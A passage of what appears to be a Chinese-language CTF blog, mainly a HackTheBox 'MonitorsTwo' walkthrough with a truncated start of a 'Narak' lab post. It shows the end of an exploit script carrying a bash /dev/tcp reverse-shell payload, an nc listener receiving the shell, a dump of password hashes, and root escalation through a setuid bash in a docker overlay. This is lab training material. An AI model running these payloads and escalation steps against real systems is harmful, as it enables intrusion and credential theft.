class="hljs-string">f&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/<span class="hljs-subst">&#123;myip&#125;</span>/<span class="hljs-subst">&#123;myport&#125;</span> 0&gt;&amp;1&#x27;&quot;</span><br>        <span class="hljs-keyword">if</span> is_vuln:<br>            Reverse_shell(payload, host_id, data_ids)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;The Bruteforce Failled...&quot;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;The target is not vulnerable&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br></code></pre></td></tr></table></figure><p>运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/Downloads/MonitorsTwo]<br>└─$ python exp.py -u http://10.10.11.211 --LHOST 10.10.14.145 --LPORT 443<br>Checking...<br>The target is vulnerable. Exploiting...<br>Bruteforcing the host_id and local_data_ids<br>Bruteforce Success!!<br></code></pre></td></tr></table></figure><p>反弹成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [10.10.14.145] from (UNKNOWN) [10.10.11.211] 55410<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@50bca5e748b0:/var/www/html$ <span class="hljs-built_in">export</span> TERM=xterm<br><span class="hljs-built_in">export</span> TERM=xterm<br>www-data@50bca5e748b0:/var/www/html$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>www-data<br>www-data@50bca5e748b0:/var/www/html$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>www-data@50bca5e748b0:/var/www/html$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux 50bca5e748b0 5.4.0-147-generic <span class="hljs-comment">#164-Ubuntu SMP Tue Mar 21 14:23:17 UTC 2023 x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>收集文件信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@50bca5e748b0:/var/www/html$ <span class="hljs-built_in">cd</span> /<br><span class="hljs-built_in">cd</span> /<br>www-data@50bca5e748b0:/$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>bin<br>boot<br>dev<br>entrypoint.sh<br>etc<br>home<br>lib<br>lib64<br>media<br>mnt<br>opt<br>proc<br>root<br>run<br>sbin<br>srv<br>sys<br>tmp<br>usr<br>var<br>www-data@50bca5e748b0:/$ <span class="hljs-built_in">cat</span> entrypoint.sh<br><span class="hljs-built_in">cat</span> entrypoint.sh<br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">set</span> -ex<br><br>wait-for-it db:3306 -t 300 -- <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;database is connected&quot;</span><br><span class="hljs-keyword">if</span> [[ ! $(mysql --host=db --user=root --password=root cacti -e <span class="hljs-string">&quot;show tables&quot;</span>) =~ <span class="hljs-string">&quot;automation_devices&quot;</span> ]]; <span class="hljs-keyword">then</span><br>    mysql --host=db --user=root --password=root cacti &lt; /var/www/html/cacti.sql<br>    mysql --host=db --user=root --password=root cacti -e <span class="hljs-string">&quot;UPDATE user_auth SET must_change_password=&#x27;&#x27; WHERE username = &#x27;admin&#x27;&quot;</span><br>    mysql --host=db --user=root --password=root cacti -e <span class="hljs-string">&quot;SET GLOBAL time_zone = &#x27;UTC&#x27;&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-built_in">chown</span> www-data:www-data -R /var/www/html<br><span class="hljs-comment"># first arg is `-f` or `--some-option`</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;1#-&#125;</span>&quot;</span> != <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">set</span> -- apache2-foreground <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br>www-data@50bca5e748b0:/$ mysql -uroot -p<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@50bca5e748b0:/var/www/html$ mysql --host=db --user=root --password=root cacti -e <span class="hljs-string">&quot;select * from user_auth&quot;</span><br><br>+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+<br><br>| <span class="hljs-built_in">id</span> | username | password                           | realm | full_name   | email_address     | must_change_password | password_change | show_tree | show_list | show_preview | graph_settings | login_opts | policy_graphs | policy_trees | policy_hosts | policy_graph_templates | enabled | lastchange | lastlogin | password_history | locked | failed_attempts | lastfail | reset_perms |<br><br>+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+<br><br>| 1 | admin  | $2y$10<span class="hljs-variable">$IhEA</span>.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |   0 | Jamie Thompson | admin@monitorstwo.htb |           | on       | on    | on    | on      | on       |     2 |       1 |      1 |      1 |           1 | on   |     -1 |    -1 | -1        |    |        0 |    0 |  663348655 |<br><br>| 3 | guest  | 43e9a4ab75570f5b                       |   0 | Guest Account |            | on          | on       | on    | on    | on      | 3       |     1 |       1 |      1 |      1 |           1 |     |     -1 |    -1 | -1        |    |        0 |    0 |      0 |<br><br>| 4 | marcus  | $2y$10<span class="hljs-variable">$vcrYth5YcCLlZaPDj6PwqOYTw68W1</span>.3WeKlBn70JonsdW/MhFYK4C |   0 | Marcus Brune  | marcus@monitorstwo.htb |           |         | on    | on    | on      | on       |     1 |       1 |      1 |      1 |           1 | on   |     -1 |    -1 |         | on   |        0 |    0 | 2135691668 |<br><br>+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+<br></code></pre></td></tr></table></figure><p>MD5 解密得到了：</p><p><img src="/pic/c5ffa2490ea0d96ee5d769850567758d_MD5.png"></p><h3 id="ssh-登录"><a href="#ssh-登录" class="headerlink" title="ssh 登录"></a>ssh 登录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">marcus@monitorstwo:~$ <span class="hljs-built_in">whoami</span><br>marcus<br>marcus@monitorstwo:~$ <span class="hljs-built_in">id</span><br>uid=1000(marcus) gid=1000(marcus) <span class="hljs-built_in">groups</span>=1000(marcus)<br>marcus@monitorstwo:~$ <span class="hljs-built_in">ls</span><br>user.txt<br>marcus@monitorstwo:~$ <span class="hljs-built_in">cat</span> user.txt<br><br>marcus@monitorstwo:~$ <span class="hljs-built_in">export</span><br><span class="hljs-built_in">declare</span> -x DBUS_SESSION_BUS_ADDRESS=<span class="hljs-string">&quot;unix:path=/run/user/1000/bus&quot;</span><br><span class="hljs-built_in">declare</span> -x HOME=<span class="hljs-string">&quot;/home/marcus&quot;</span><br><span class="hljs-built_in">declare</span> -x LANG=<span class="hljs-string">&quot;en_US.UTF-8&quot;</span><br><span class="hljs-built_in">declare</span> -x LESSCLOSE=<span class="hljs-string">&quot;/usr/bin/lesspipe %s %s&quot;</span><br><span class="hljs-built_in">declare</span> -x LESSOPEN=<span class="hljs-string">&quot;| /usr/bin/lesspipe %s&quot;</span><br><span class="hljs-built_in">declare</span> -x LOGNAME=<span class="hljs-string">&quot;marcus&quot;</span><br><span class="hljs-built_in">declare</span> -x LS_COLORS=<span class="hljs-string">&quot;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=0131:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*wm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*vb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=0;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:&quot;</span><br><span class="hljs-built_in">declare</span> -x MOTD_SHOWN=<span class="hljs-string">&quot;pam&quot;</span><br><span class="hljs-built_in">declare</span> -x OLDPWD<br><span class="hljs-built_in">declare</span> -x PATH=<span class="hljs-string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin&quot;</span><br><span class="hljs-built_in">declare</span> -x PWD=<span class="hljs-string">&quot;/home/marcus&quot;</span><br><span class="hljs-built_in">declare</span> -x SHELL=<span class="hljs-string">&quot;/bin/bash&quot;</span><br><span class="hljs-built_in">declare</span> -x SHLVL=<span class="hljs-string">&quot;1&quot;</span><br><span class="hljs-built_in">declare</span> -x SSH_CLIENT=<span class="hljs-string">&quot;10.10.14.145 33960 22&quot;</span><br><span class="hljs-built_in">declare</span> -x SSH_CONNECTION=<span class="hljs-string">&quot;10.10.14.145 33960 10.10.11.211 22&quot;</span><br><span class="hljs-built_in">declare</span> -x SSH_TTY=<span class="hljs-string">&quot;/dev/pts/1&quot;</span><br><span class="hljs-built_in">declare</span> -x TERM=<span class="hljs-string">&quot;xterm&quot;</span><br><span class="hljs-built_in">declare</span> -x USER=<span class="hljs-string">&quot;marcus&quot;</span><br><span class="hljs-built_in">declare</span> -x XDG_RUNTIME_DIR=<span class="hljs-string">&quot;/run/user/1000&quot;</span><br><span class="hljs-built_in">declare</span> -x XDG_SESSION_CLASS=<span class="hljs-string">&quot;user&quot;</span><br><span class="hljs-built_in">declare</span> -x XDG_SESSION_ID=<span class="hljs-string">&quot;8&quot;</span><br><span class="hljs-built_in">declare</span> -x XDG_SESSION_TYPE=<span class="hljs-string">&quot;tty&quot;</span><br><br></code></pre></td></tr></table></figure><p>查找 s 权限的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">marcus@monitorstwo:~$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>    57222     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>    54839     16 -rwsr-xr-x   1 root     root          14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device<br>    55563     24 -rwsr-xr-x   1 root     root          22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1<br>    55805    464 -rwsr-xr-x   1 root     root         473576 Mar 30  2022 /usr/lib/openssh/ssh-keysign<br>    54134     56 -rwsr-xr-x   1 root     root          55528 Feb  7  2022 /usr/bin/mount<br>     1574    164 -rwsr-xr-x   1 root     root         166056 Apr  4 11:56 /usr/bin/sudo<br>    54751     88 -rwsr-xr-x   1 root     root          88464 Nov 29  2022 /usr/bin/gpasswd<br>    57248     40 -rwsr-xr-x   1 root     root          39144 Feb  7  2022 /usr/bin/umount<br>    54761     68 -rwsr-xr-x   1 root     root          68208 Nov 29  2022 /usr/bin/passwd<br>    54142     40 -rwsr-xr-x   1 root     root          39144 Mar  7  2020 /usr/bin/fusermount<br>    54717     52 -rwsr-xr-x   1 root     root          53040 Nov 29  2022 /usr/bin/chsh<br>    53964     56 -rwsr-sr-x   1 daemon   daemon        55560 Nov 12  2018 /usr/bin/at<br>    54397     84 -rwsr-xr-x   1 root     root          85064 Nov 29  2022 /usr/bin/chfn<br>    54599     44 -rwsr-xr-x   1 root     root          44784 Nov 29  2022 /usr/bin/newgrp<br>    57185     68 -rwsr-xr-x   1 root     root          67816 Feb  7  2022 /usr/bin/su<br></code></pre></td></tr></table></figure><p>查找可写文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">marcus@monitorstwo:~$ find / -<span class="hljs-built_in">type</span> f -writable -not -path <span class="hljs-string">&quot;/proc/*&quot;</span> -not -path <span class="hljs-string">&quot;/sys/*&quot;</span> 2&gt;/dev/null<br>/tmp/linpeas.sh<br>/tmp/exp.sh<br>/home/marcus/.bash_logout<br>/home/marcus/.cache/motd.legal-displayed<br>/home/marcus/.bashrc<br>/home/marcus/.profile<br>/home/marcus/.gnupg/pubring.kbx<br>/home/marcus/.gnupg/trustdb.gpg<br></code></pre></td></tr></table></figure><p>进程信息，这里是看了 WP 才知道还有这种提权手法，顺便过滤 docker 信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">marcus@monitorstwo:~$ ps aux | grep docker<br>root         903  0.0  2.1 1455744 85476 ?       Ssl  Jun09   0:06 /usr/sbin/dockerd -H fd://<br>root        1331  0.0  0.0 1223816 3644 ?        Sl   Jun09   0:00 /usr/sbin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.19.0.3 -container-port 80<br>marcus     33355  0.0  0.0   6432   720 pts/1    S+   03:12   0:00 grep --color=auto docker<br></code></pre></td></tr></table></figure><p>查看 docker 目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">marcus@monitorstwo:~$ findmnt<br>TARGET                                SOURCE      FSTYPE      OPTIONS<br>/                                     /dev/sda2   ext4        rw,relatime<br>├─/sys                                sysfs       sysfs       rw,nosuid,nodev,noexec,relatime<br>│ ├─/sys/kernel/security              securityfs  securityfs  rw,nosuid,nodev,noexec,relatime<br>│ ├─/sys/fs/cgroup                    tmpfs       tmpfs       ro,nosuid,nodev,noexec,mode=755<br>│ │ ├─/sys/fs/cgroup/unified          cgroup2     cgroup2     rw,nosuid,nodev,noexec,relatime,nsdelegate<br>│ │ ├─/sys/fs/cgroup/systemd          cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,xattr,name=systemd<br>│ │ ├─/sys/fs/cgroup/perf_event       cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,perf_event<br>│ │ ├─/sys/fs/cgroup/rdma             cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,rdma<br>│ │ ├─/sys/fs/cgroup/memory           cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,memory<br>│ │ ├─/sys/fs/cgroup/cpu,cpuacct      cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,cpu,cpuacct<br>│ │ ├─/sys/fs/cgroup/blkio            cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,blkio<br>│ │ ├─/sys/fs/cgroup/cpuset           cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,cpuset<br>│ │ ├─/sys/fs/cgroup/net_cls,net_prio cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,net_cls,net_prio<br>│ │ ├─/sys/fs/cgroup/devices          cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,devices<br>│ │ ├─/sys/fs/cgroup/freezer          cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,freezer<br>│ │ ├─/sys/fs/cgroup/pids             cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,pids<br>│ │ └─/sys/fs/cgroup/hugetlb          cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,hugetlb<br>│ ├─/sys/fs/pstore                    pstore      pstore      rw,nosuid,nodev,noexec,relatime<br>│ ├─/sys/fs/bpf                       none        bpf         rw,nosuid,nodev,noexec,relatime,mode=700<br>│ ├─/sys/kernel/debug                 debugfs     debugfs     rw,nosuid,nodev,noexec,relatime<br>│ ├─/sys/kernel/tracing               tracefs     tracefs     rw,nosuid,nodev,noexec,relatime<br>│ ├─/sys/kernel/config                configfs    configfs    rw,nosuid,nodev,noexec,relatime<br>│ └─/sys/fs/fuse/connections          fusectl     fusectl     rw,nosuid,nodev,noexec,relatime<br>├─/proc                               proc        proc        rw,nosuid,nodev,noexec,relatime<br>│ └─/proc/sys/fs/binfmt_misc          systemd-1   autofs      rw,relatime,fd=28,pgrp=1,<span class="hljs-built_in">timeout</span>=0,minproto=5,maxproto=5,direct,pipe_ino=16442<br>│   └─/proc/sys/fs/binfmt_misc        binfmt_misc binfmt_misc rw,nosuid,nodev,noexec,relatime<br>├─/dev                                udev        devtmpfs    rw,nosuid,noexec,relatime,size=1966928k,nr_inodes=491732,mode=755<br>│ ├─/dev/pts                          devpts      devpts      rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000<br>│ ├─/dev/shm                          tmpfs       tmpfs       rw,nosuid,nodev<br>│ ├─/dev/hugepages                    hugetlbfs   hugetlbfs   rw,relatime,pagesize=2M<br>│ └─/dev/mqueue                       mqueue      mqueue      rw,nosuid,nodev,noexec,relatime<br>├─/run                                tmpfs       tmpfs       rw,nosuid,nodev,noexec,relatime,size=402608k,mode=755<br>│ ├─/run/lock                         tmpfs       tmpfs       rw,nosuid,nodev,noexec,relatime,size=5120k<br>│ ├─/run/docker/netns/017a1d8be84e    nsfs[net:[4026532597]]<br>│ │                                               nsfs        rw<br>│ ├─/run/user/1000                    tmpfs       tmpfs       rw,nosuid,nodev,relatime,size=402608k,mode=700,uid=1000,gid=1000<br>│ └─/run/docker/netns/7557ab04a14c    nsfs[net:[4026532660]]<br>│                                                 nsfs        rw<br>├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged<br>│                                     overlay     overlay     rw,relatime,lowerdir=/var/lib/docker/overlay2/l/756FTPFO4AE7HBWVGI5TXU76FU:/var/lib/docker/overlay2/l/XKE4ZK5GJUTHXKVYS4MQMJ3NOB:/var/lib/docker<br>├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm<br>│                                     shm         tmpfs       rw,nosuid,nodev,noexec,relatime,size=65536k<br>├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged<br>│                                     overlay     overlay     rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GXAJOAA4SJ:/var/lib/docker/overlay2/l/Z4RNRWTZKMXNQJVSRJE4P2JYHH:/var/lib/docker<br>└─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm<br>                                      shm         tmpfs       rw,nosuid,nodev,noexec,relatime,size=65536k<br></code></pre></td></tr></table></figure><p>查看 docker 目录下是否有 s 权限的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ <span class="hljs-built_in">cd</span> /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007ef<br>marcus@monitorstwo:/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged$ <span class="hljs-built_in">ls</span> -laih bin/bash<br>24304 -rwxr-xr-x 1 root root 942K Nov 23  2021 bin/bash<br>marcus@monitorstwo:/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged$ <span class="hljs-built_in">cd</span> /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb<br>marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ <span class="hljs-built_in">ls</span> -laih bin/bash<br>41766 -rwsr-xr-x 1 root root 1.2M Mar 27  2022 bin/bash<br>marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ bin/bash -p<br>bash-5.1<span class="hljs-comment"># id</span><br>uid=1000(marcus) gid=1000(marcus) euid=0(root) <span class="hljs-built_in">groups</span>=1000(marcus)<br>bash-5.1<span class="hljs-comment"># whoami</span><br>root<br>bash-5.1<span class="hljs-comment"># pwd</span><br>/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged<br>bash-5.1<span class="hljs-comment"># cd /root</span><br></code></pre></td></tr></table></figure><p>查看文件信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-5.1<span class="hljs-comment"># cat root.txt</span><br>bash-5.1<span class="hljs-comment"># cd /home/marcus</span><br>bash-5.1<span class="hljs-comment"># cat user.txt</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>hackthebox</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Narak靶机</title>
    <link href="/2023/06/fcf9aaa77e9b.html"/>
    <url>/2023/06/fcf9aaa77e9b.html</url>
    
    <content type="html"><![CDATA[<h1 id="Narak-靶机"><a href="#Narak-靶机" class="headerlink" title="Narak 靶机"></a>Narak 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.1.1.129          <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-08 21:28 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.129<br>Host is up (0.00074s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 00:0C:29:02:D4:D7 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 2.25 seconds<br>                                                                                                                                                                                             